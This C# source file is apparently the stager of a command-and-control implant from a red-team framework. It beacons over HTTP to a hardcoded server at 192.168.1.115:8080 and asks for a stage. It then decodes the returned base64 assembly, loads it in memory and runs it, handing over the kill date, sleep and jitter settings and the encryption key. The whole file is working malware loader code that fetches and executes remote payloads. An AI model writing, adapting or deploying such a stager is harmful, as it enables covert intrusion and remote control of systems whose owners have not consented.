using Shared.Models;
using Shared.Utilities;

using Stager.Comms;
using Stager.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Stager
{
    public class Stager
    {
        static string AgentID;

        static CommModule CommModule;
        static StagerModule StagerModule;

        static bool Staged = false;

        public delegate void StagerCommand(AgentTask Task);

        public Stager()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Stager();
        }

        public static void Execute()
        {
            AgentID = Utilities.GetRandomString(6);

            StagerModule = new StagerModule
            {
                Commands = new List<StagerModule.StagerCommand>
                {
                    new StagerModule.StagerCommand
                    {
                        Name = "StageResponse",
                        Delegate = StageResponse
                    }
                }
            };

            CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
            SendStageRequest();

            System.Threading.Thread.Sleep(20000);

            CommModule.Start();

            while (!Staged)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    var task = Crypto.Decrypt<AgentTask>(Message.Data, Message.IV);

                    var callback = StagerModule.Commands
                        .FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase))
                        .Delegate;

                    callback?.Invoke(task);
                }
            }
        }

        static void SendStageRequest()
        {
            var c2Data = Crypto.Encrypt(
                new C2Data
                {
                    Module = "Core",
                    Command = "StageRequest"
                },
                out byte[] iv);

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = AgentID,
                    Data = c2Data,
                    IV = iv
                });
        }

        static void StageResponse(AgentTask Task)
        {
            CommModule.Stop();
            Staged = true;

            var bytes = Convert.FromBase64String((string)Task.Parameters["Stage"]);
            var asm = Assembly.Load(bytes);

            asm.GetType("Agent.Stage").GetMethod("HTTPEntry").Invoke(null, new object[]
            {
                AgentID,
                KillDate,
                ConnectAddress,
                ConnectPort,
                SleepInterval,
                SleepJitter,
                Crypto.EncryptionKey
            });
        }

        static string ConnectAddress
        {
            get { return "192.168.1.115"; }
        }

        static int ConnectPort
        {
            get { return 8080; }
        }

        static int SleepInterval
        {
            get { return 5; }
        }

        static int SleepJitter
        {
            get { return 25; }
        }

        static DateTime KillDate
        {
            get { return DateTime.Parse("01/01/2030 00:00:01"); }
        }
    }
}